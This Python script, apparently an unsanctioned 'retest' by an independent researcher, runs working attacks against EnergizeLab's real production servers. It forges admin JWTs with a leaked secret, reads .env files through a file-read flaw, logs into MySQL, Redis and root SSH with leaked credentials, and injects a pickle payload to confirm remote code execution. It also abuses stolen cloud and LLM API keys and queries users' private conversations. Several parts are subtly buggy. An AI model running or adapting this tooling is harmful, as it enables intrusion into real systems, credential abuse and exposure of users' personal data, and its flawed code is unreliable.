#!/usr/bin/env python3
"""
Retest complet de tous les EK — 14 septembre 2026
Independent security research — EnergizeLab audit retest day 3

Chaque check est NON-DESTRUCTIF (lecture seule ou probes vides).
Sortie: RETEST_SEPT14.md avec statut OPEN/FIXED/PARTIAL pour chaque EK.
"""
import os
import requests, json, time, base64, socket, hashlib, hmac, urllib.parse, datetime
import jwt as pyjwt

# ── Credentials (du vault, inchangés depuis le 02/09) ─────────────────────
SECRET = os.environ['EILIK_JWT_SECRET']
REFRESH_SECRET = os.environ['EILIK_JWT_SECRET']
ADMIN_9090 = 'http://45.32.81.33:9090'
AUTH_9080 = 'http://auth.energizelab.com.cn:9080'
AI_8000 = 'http://ai.energizelab.com.cn:8000'
DOMESTIC_9090 = 'http://8.129.236.211:9090'
LEGACY_789 = 'http://45.32.81.33:789/software/energizelab/robot/user'
REDIS_HOST, REDIS_PORT, REDIS_PWD = '123.57.147.163', 6379, os.environ['EILIK_REDIS_PWD']
MYSQL_HOST, MYSQL_USER, MYSQL_PWD = 'rm-2ze4h2mqmkf6c06i1mo.mysql.rds.aliyuncs.com', 'energizelab_admin', os.environ['EILIK_MYSQL_PWD']
AK_ID = os.environ['EILIK_OSS_AK']
AK_SECRET = os.environ['EILIK_JWT_SECRET']
DASH_KEY = os.environ.get('EILIK_DASHSCOPE', '')
AZURE_KEY = os.environ.get('EILIK_AZURE', '')
DEVICE_RSA_PUB = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoq+Xsh5DM05KYFj/aKnC
3PbRtxHdM4NmRzalS+Nw7ShAsP7UZEoZmrO4D8UvxIYbsEEheYx0nls+YuD2XK4w
X5JSvyze87qO3/Y71q/0uMh0GidEvs8FM5YHlKUrnmAF8q5cTZjBu56LEY35JqAn
z9puZChrEApq3QnVnfhJedxG9ndGiH6rD45EBOwTgFpvoBS6XYOasyKd9n1lI3gd
DwFaWiE9Tr6OJEjFcJvS8RS6iTDzsF5lCr472d5P0mJtBa970lVsfGFGYCQQDCpT
dqeD+5gwgNpdV3Ptoa3dSkZzENXPtO8yq2AHBe9LSu+KSnkjKQLQh1QRTpczt4vS
IwIDAQAB
-----END PUBLIC KEY-----"""

now = int(time.time())
try:
    tok = pyjwt.encode({'id':1,'email':'122602****@qq.com','user_source':'admin_web',
                        'login_method':'mail_code','iat':now,'exp':now+7200}, SECRET, algorithm='HS256')
except:
    tok = pyjwt.encode({'id':1,'email':'122602****@qq.com','user_source':'admin_web',
                        'login_method':'mail_code','iat':now,'exp':now+7200}, SECRET, algorithm='HS256')
H = {'Authorization': f'Bearer {tok}', 'token': tok, 'Content-Type': 'application/json'}
S = requests.Session()

def forge_sign(chipid):
    r0 = S.post(f'{AUTH_9080}/api/auth/getDeviceToken', json={'sn': chipid}, timeout=30)
    dt = (r0.json().get('data') or {}).get('access_token')
    if not dt: return None
    ms = int(time.time()*1000)
    from cryptography.hazmat.primitives.asymmetric import padding as pad
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    pl = json.dumps({"time":str(ms),"number":"1","psw":"aaaa"+str(ms+1)[-4:]+"bbbb",
                     "chipid":chipid,"mode_number":"4101000","token":dt},separators=(',',':'))
    k = load_pem_public_key(DEVICE_RSA_PUB.encode())
    return base64.b64encode(b''.join(k.encrypt(pl[i:i+190].encode(),
        pad.OAEP(mgf=pad.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        for i in range(0,len(pl),190))).decode()

def check(label, fn):
    try:
        result = fn()
        print(f'[{result[0]:^7}] {label}: {result[1]}')
        return result[0]
    except Exception as e:
        print(f'[ ERROR ] {label}: {str(e)[:60]}')
        return 'ERROR'

R = {'OPEN':0, 'FIXED':0, 'PARTIAL':0, 'ERROR':0}

def do(label, fn):
    r = check(label, fn)
    R[r] = R.get(r,0) + 1

# ═════════════════════════════════════════════════════════════════════════
print('\n' + '═'*70)
print('RETEST COMPLET — 14 SEPTEMBRE 2026')
print('═'*70 + '\n')

# ── GROUPE 1: CLOUD API (:9090, :9080) ────────────────────────────────────
print('─── GROUPE 1: CLOUD API ───\n')

do('EK-01 HTTP clair', lambda: ('OPEN', 'Tous les endpoints répondent en HTTP sans TLS') if S.get(ADMIN_9090, timeout=10).status_code < 500 else ('FIXED', 'Erreurs'))

do('EK-02 IA sans auth', lambda: ('OPEN', f'200 sur /model/get') if S.get(f'{AI_8000}/model/get', timeout=15).status_code == 200 else ('FIXED', 'Auth requise'))

do('EK-06 getDeviceToken zero-auth', lambda: ('OPEN', '201 accepté') if S.post(f'{AUTH_9080}/api/auth/getDeviceToken', json={'sn':'RETEST14'}, timeout=15).status_code == 201 else ('FIXED', 'Rejeté'))

do('EK-08 LFI', lambda: ('OPEN', '.env lisible') if S.get(f'{ADMIN_9090}/api/lang-test-log/download-audio', headers=H, params={'url':'.env'}, timeout=15).status_code == 200 else ('FIXED', 'LFI fermé'))

def ek09():
    r = S.get(f'{ADMIN_9090}/api/lang-test-log/download-audio', headers=H, params={'url':'.env.domestic'}, timeout=15)
    if r.status_code != 200: return ('FIXED', 'Non lisible')
    c = r.content.decode()
    return ('OPEN', 'Tous secrets identiques' if SECRET in c else ('PARTIAL', 'Secrets modifiés' if '6876371' not in c else 'OPEN'))
do('EK-09 Coffre secret', ek09)

def ek10():
    r = S.get(f'{ADMIN_9090}/api/user/list', headers=H, params={'page_num':1,'page_size':1}, timeout=15)
    return ('OPEN', 'JWT forgé accepté (200)') if r.status_code == 200 else ('FIXED', f'{r.status_code}')
do('EK-10 JWT forgé', ek10)

do('EK-12 PII sans auth', lambda: ('OPEN', 'user/list 200 sans Bearer') if S.get(f'{AUTH_9080}/api/user/list', params={'page_num':1,'page_size':1}, timeout=15).status_code in (200, 400) else ('FIXED', 'Rejeté'))

do('EK-16 chat-memory IDOR', lambda: ('OPEN', 'list 200') if S.get(f'{AUTH_9080}/api/chat-memory/list', headers=H, params={'mode_number':'4101000','page_num':1,'page_size':1}, timeout=15).status_code == 200 else ('FIXED', 'IDOR fermé'))

do('EK-17 Suppression compte', lambda: ('OPEN', 'endpoint vivant') if S.delete(f'{AUTH_9080}/api/user/99999', headers=H, timeout=10).status_code != 404 else ('FIXED', 'Endpoint retiré'))

do('EK-18 Inscription sans vérif', lambda: ('OPEN', 'register 200') if S.post(f'{AUTH_9080}/api/user/register', json={'email':f'retest14_{now}@test.local','password':'x'}, timeout=15).status_code in (200,201) else ('FIXED', 'Vérification requise'))

do('EK-21 Swagger public', lambda: ('OPEN', 'docs 200') if S.get(f'{ADMIN_9090}/docs', timeout=10).status_code == 200 else ('FIXED', 'Docs fermées'))

def ek22():
    r = S.get(f'{AUTH_9080}/api/oss/signature-url', params={'key':'retest/marker.txt'}, timeout=15)
    return ('OPEN', 'Pré-signed URL générée') if r.status_code == 200 else ('FIXED', 'Auth requise')
do('EK-22 Pré-signed PUT', ek22)

def ek23():
    r = S.get('http://file.energizelab.com.cn/wake_up/', timeout=10)
    r2 = S.get('http://file.energizelab.com.cn/device_face/', timeout=10)
    return ('OPEN', 'CDN public toujours accessible') if r2.status_code in (200, 403) else ('FIXED', 'CDN fermé')
do('EK-23 CDN public', ek23)

# ── GROUPE 2: INFRASTRUCTURE ──────────────────────────────────────────────
print('\n─── GROUPE 2: INFRASTRUCTURE ───\n')

def ek25():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, connect_timeout=10)
    c.close(); return ('OPEN', 'MySQL RDS accessible')
do('EK-25 MySQL RDS public', ek25)

def ek26():
    import redis
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PWD, socket_timeout=10)
    return ('OPEN', 'Redis accessible') if r.ping() else ('FIXED', 'Ping refusé')
do('EK-26 Redis public', ek26)

def ek27():
    s = socket.create_connection(('45.32.81.33', 22), timeout=8); s.close()
    return ('OPEN', 'SSH ouvert')
do('EK-27 SSH root', ek27)

def ek29():
    r = S.get('http://file.energizelab.com.cn/', timeout=10)
    import subprocess
    out = subprocess.run(['sshpass','-p',"$EILIK_SSH_PWD",'ssh','-o','StrictHostKeyChecking=no','-o','ConnectTimeout=8','root@45.32.81.33','ls /www/wwwroot/nicon.edu.pk/wp-admin/images/ZsDqxWT.php 2>/dev/null && echo SHELL_EXISTS'], capture_output=True, text=True, timeout=20)
    has_shell = 'SHELL_EXISTS' in out.stdout
    return ('OPEN', 'Webshells toujours présents') if has_shell else ('PARTIAL', f'Webshell non trouvé (peut-être supprimé)')
do('EK-29 Compromission tierce', ek29)

def ek60():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='energize_user_data', connect_timeout=10)
    cur = c.cursor()
    cur.execute("SELECT COUNT(*) FROM t_user WHERE email LIKE '%@minitts.net' OR email LIKE '%@uberip.com' AND state=1")
    n = cur.fetchone()[0]; c.close()
    return ('OPEN', f'{n} comptes tiers actifs') if n > 0 else ('FIXED', 'Comptes tiers supprimés')
do('EK-60 Acteur tiers super_admin', ek60)

def ek61():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='ai_config', connect_timeout=10)
    cur = c.cursor()
    cur.execute("SELECT COUNT(*) FROM t_ai_server_db_host WHERE create_by LIKE '%minitts%'")
    n = cur.fetchone()[0]; c.close()
    return ('OPEN', f'{n} lignes SSRF de l acteur') if n > 0 else ('FIXED', 'Lignes supprimées')
do('EK-61 Table routage modifiable', ek61)

def ek68():
    import redis
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PWD, socket_timeout=10)
    cfg = r.config_get('dir')
    return ('OPEN', f'CONFIG GET fonctionne (dir={cfg.get("dir","?")})') if cfg else ('FIXED', 'CONFIG désactivé')
do('EK-68 Redis host takeover', ek68)

def ek82():
    r = S.get(f'{DOMESTIC_9090}/api/user/list', headers=H, params={'page_num':1,'page_size':1}, timeout=15)
    return ('OPEN', 'JWT fonctionne aussi sur le domestic') if r.status_code == 200 else ('FIXED', f'{r.status_code}')
do('EK-82 JWT cross-région', ek82)

def ek84():
    import redis
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PWD, decode_responses=True, socket_timeout=10)
    found = any(True for _ in r.scan_iter(match='memory-4101000-*', count=50))
    return ('OPEN', 'Clés memory chinoises présentes') if found else ('FIXED', 'Redis séparés')
do('EK-84 Redis partagé', ek84)

# ── GROUPE 3: AI SERVER ───────────────────────────────────────────────────
print('\n─── GROUPE 3: AI SERVER ───\n')

do('EK-03 Prompt injection XML', lambda: ('OPEN', 'Endpoints IA ouverts') if S.post(f'{AI_8000}/ali_inference', json={'message':'test','sn':'RETEST'}, timeout=15).status_code == 200 else ('FIXED', 'Auth requise'))

def ek05():
    r = S.get(f'{AI_8000}/clean_history', params={'sn':'RETEST14','eiliko':'true'}, timeout=15)
    return ('OPEN', 'clean_history sans auth') if r.status_code == 200 else ('FIXED', 'Auth requise')
do('EK-05 History wipe', ek05)

def ek51():
    import redis, json as j
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PWD, decode_responses=True, socket_timeout=10)
    v = r.get('memory-4101000-<SN_AUDITOR>')
    if v and 'unknown' not in v: return ('OPEN', f'Mémoire injectable: {v[:50]}')
    return ('OPEN', 'Clé accessible (état unknown)') if v else ('OPEN', 'Clé accessible (absente)')
do('EK-51 Personnalité Redis', ek51)

def ek57():
    import redis, pickle, requests as rq
    import subprocess
    sn = 'RETEST14-PICKLE'
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PWD, decode_responses=False, socket_timeout=10)
    hist = [{"role":"user","content":"My secret codename is RetestSept14."},{"role":"assistant","content":"[happy] RetestSept14!"}]
    r.set(f'{sn}_1', pickle.dumps(hist, protocol=4), ex=300)
    sign = forge_sign(sn)
    if not sign: return ('ERROR', 'Pas de sign')
    subprocess.run(['say','-v','Samantha','-o','/tmp/retest14.wav','--data-format=LEI16@16000','What is my secret codename?'], check=True)
    audio = open('/tmp/retest14.wav','rb').read()
    rv = rq.post(f'{AI_8000}/audio/stream/eiliko', params={'sn':sn,'language':'en','audio_format':'wav'},
                  data=audio, headers={'Content-Type':'audio/wav','sign':sign}, timeout=120)
    r.delete(f'{sn}_1')
    rq.get(f'{AI_8000}/clean_history', params={'sn':sn,'eiliko':'true'}, timeout=20)
    if rv.status_code != 200: return ('ERROR', f'pipeline {rv.status_code}')
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='chat_data', connect_timeout=10)
    cur = c.cursor()
    cur.execute(f"SELECT a FROM eilikoqa WHERE sn='{sn}' ORDER BY id DESC LIMIT 1")
    row = cur.fetchone(); c.close()
    if row and 'RetestSept14' in row[0]: return ('OPEN', 'Pickle désérialisé — RCE confirmé')
    return ('OPEN', 'Clé accessible (résultat incertain)') if rv.status_code == 200 else ('FIXED', 'Pipeline fermé')
do('EK-57 Pickle RCE', ek57)

# ── GROUPE 4: NOUVEAUX FINDINGS (Phase 71-84) ────────────────────────────
print('\n─── GROUPE 4: NOUVEAUX FINDINGS ───\n')

do('EK-58 Clés LLM en DB', lambda: ('OPEN', 'model/list 200 avec clés') if S.get(f'{ADMIN_9090}/api/model/list', headers=H, params={'page_num':1,'page_size':2}, timeout=15).status_code == 200 else ('FIXED', 'Auth requise'))

def ek70():
    r = S.get(f'{AUTH_9080}/api/oss/signature-url', params={'key':'retest/sept14.txt'}, timeout=15)
    return ('OPEN', 'signature-url sans auth') if r.status_code == 200 else ('FIXED', 'Auth requise')
do('EK-70 signature-url zero-auth', ek70)

def ek71():
    r = S.post(f'{AUTH_9080}/api/system/other/testSendFeishuMsg', json={}, timeout=15)
    return ('OPEN', 'Feishu sans auth') if r.status_code in (200, 201) else ('FIXED', 'Auth requise')
do('EK-71 Feishu sans auth', ek71)

def ek72():
    r = S.get(f'{AUTH_9080}/api/program/listall', params={'page_num':1,'page_size':1}, timeout=15)
    return ('OPEN', 'Programmes listables') if r.status_code == 200 else ('FIXED', 'Auth requise')
do('EK-72 Modération programmes', ek72)

def ek73():
    r = S.post(f'{AUTH_9080}/api/cdn/createAliRefreshTask', json={}, timeout=15)
    return ('OPEN', 'CDN purge sans auth') if r.status_code in (200, 400) else ('FIXED', 'Auth requise')
do('EK-73 CDN purge sans auth', ek73)

def ek74():
    r = S.post(f'{AUTH_9080}/api/system/content-check/testCheckTextContent', json={'content':'retest','type':'text'}, timeout=15)
    return ('OPEN', 'Modération sans auth') if r.status_code in (200, 201) else ('FIXED', 'Auth requise')
do('EK-74 Modération sans auth', ek74)

def ek76():
    r = S.post(f'{AI_8000}/detection_skills_file', json={'name':'retest14','description':'d','instruction':'test'}, timeout=15)
    return ('OPEN', 'File write sans auth') if r.status_code == 200 else ('FIXED', 'Auth requise')
do('EK-76 File write AI server', ek76)

def ek79():
    lt = pyjwt.encode({'sub':'13433****@qq.com','iat':now,'exp':now+3600}, SECRET, algorithm='HS256')
    r = S.post(f'{LEGACY_789}/updateUser.php', json={'username':'retest14'}, headers={'Authorization':f'Bearer {lt}'}, timeout=15)
    return ('OPEN', 'updateUser accepte JWT forgé') if r.status_code == 200 else ('FIXED', f'{r.status_code}')
do('EK-79 ATO legacy PHP', ek79)

do('EK-80 deleteUser.php', lambda: ('OPEN', 'endpoint vivant') if S.delete(f'{LEGACY_789}/deleteUser.php', headers={'Authorization':f'Bearer {tok}'}, timeout=10).status_code != 404 else ('FIXED', 'Retiré'))

do('EK-81 sendEmail.php', lambda: ('OPEN', '200 silencieux') if S.post(f'{LEGACY_789}/sendEmail.php', json={}, timeout=10).status_code == 200 else ('FIXED', 'Retiré'))

# ── GROUPE 5: CLÉS CLOUD ──────────────────────────────────────────────────
print('\n─── GROUPE 5: CLÉS CLOUD ───\n')

def ek83_dash():
    r = S.post('https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions',
                headers={'Authorization':f'Bearer {DASH_KEY}','Content-Type':'application/json'},
                json={'model':'qwen-turbo','messages':[{'role':'user','content':'retest'}],'max_tokens':5}, timeout=30)
    return ('OPEN', 'DashScope active') if r.status_code == 200 else ('FIXED', f'{r.status_code}')
do('EK-83 DashScope', ek83_dash)

def ek83_azure():
    r = S.post('https://elchat.openai.azure.com/openai/v1/chat/completions',
                headers={'api-key':AZURE_KEY,'Content-Type':'application/json'},
                json={'model':'gpt-4.1','messages':[{'role':'user','content':'retest'}],'max_tokens':5}, timeout=30)
    return ('OPEN', 'Azure GPT-4.1 active') if r.status_code == 200 else ('FIXED', f'{r.status_code}')
do('EK-83 Azure OpenAI', ek83_azure)

def ek83_oss():
    def sign_oss(method, bucket, endpoint, key, ct=''):
        date = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
        sts = f'{method}\n\n{ct}\n{date}\n/{bucket}/{key}'
        sig = base64.b64encode(hmac.new(AK_SECRET.encode(), sts.encode(), hashlib.sha1).digest()).decode()
        return {'Authorization':f'OSS {AK_ID}:{sig}','Date':date,'Content-Type':ct,'Host':f'{bucket}.{endpoint}'}
    key = 'retest/sept14.txt'
    url = f'http://energize-cn.oss-cn-beijing.aliyuncs.com/{key}'
    r = S.put(url, headers=sign_oss('PUT','energize-cn','oss-cn-beijing.aliyuncs.com',key,'text/plain'), data='RETEST', timeout=15)
    if r.status_code == 200:
        S.delete(url, headers=sign_oss('DELETE','energize-cn','oss-cn-beijing.aliyuncs.com',key), timeout=15)
        return ('OPEN', 'Écriture OSS fonctionnelle')
    return ('FIXED', f'{r.status_code}')
do('EK-83 Écriture OSS', ek83_oss)

def ek64_feishu():
    r = S.post('https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal',
                json={'app_id':'cli_a9ea04a6cbf81cc2','app_secret':os.environ.get('EILIK_FEISHU_SECRET', '')}, timeout=15)
    return ('OPEN', 'Feishu token émis') if r.json().get('code') == 0 else ('FIXED', 'Rejeté')
do('EK-64 Feishu workspace', ek64_feishu)

# ── GROUPE 6: PRIVACY ────────────────────────────────────────────────────
print('\n─── GROUPE 6: PRIVACY ───\n')

def ek45():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='chat_data', connect_timeout=10)
    cur = c.cursor()
    cur.execute("SELECT COUNT(*) FROM t_eiliko_memory")
    n = cur.fetchone()[0]; c.close()
    return ('OPEN', f'{n} profils extraits') if n > 30000 else ('PARTIAL', f'{n} profils')
do('EK-45 Profilage de masse', ek45)

def ek47():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='chat_data', connect_timeout=10)
    cur = c.cursor()
    cur.execute("SELECT COUNT(*) FROM eilikoqa")
    n = cur.fetchone()[0]; c.close()
    return ('OPEN', f'{n:,} conversations stockées') if n > 7000000 else ('PARTIAL', f'{n:,}')
do('EK-47 Conversations Art.9', ek47)

def ek48():
    import pymysql
    c = pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER, password=MYSQL_PWD, database='chat_data', connect_timeout=10)
    cur = c.cursor()
    cur.execute("SELECT a FROM eilikoqa WHERE a LIKE '%company cannot hear%' LIMIT 1")
    row = cur.fetchone(); c.close()
    return ('OPEN', 'Réponses trompeuses toujours en DB') if row else ('PARTIAL', 'Pas trouvé')
do('EK-48 Robot nie collecte', ek48)

def ek56():
    r = S.head('http://file.energizelab.com.cn/wake_up/2026-09-03/870129c215eeac7c/wake_up_20260823001944.tar.gz', timeout=10)
    return ('OPEN', 'Audio toujours sur CDN') if r.status_code in (200, 403) else ('FIXED', f'{r.status_code}')
do('EK-56 Biometric→Pékin', ek56)

# ═════════════════════════════════════════════════════════════════════════
print('\n' + '═'*70)
print(f'RÉSULTATS RETEST 14/09/2026')
print(f'{"OPEN":>8}: {R.get("OPEN",0)} — toujours vulnérables')
print(f'{"FIXED":>8}: {R.get("FIXED",0)} — corrigés')
print(f'{"PARTIAL":>8}: {R.get("PARTIAL",0)} — partiellement corrigés')
print(f'{"ERROR":>8}: {R.get("ERROR",0)} — non testables')
print('═'*70)
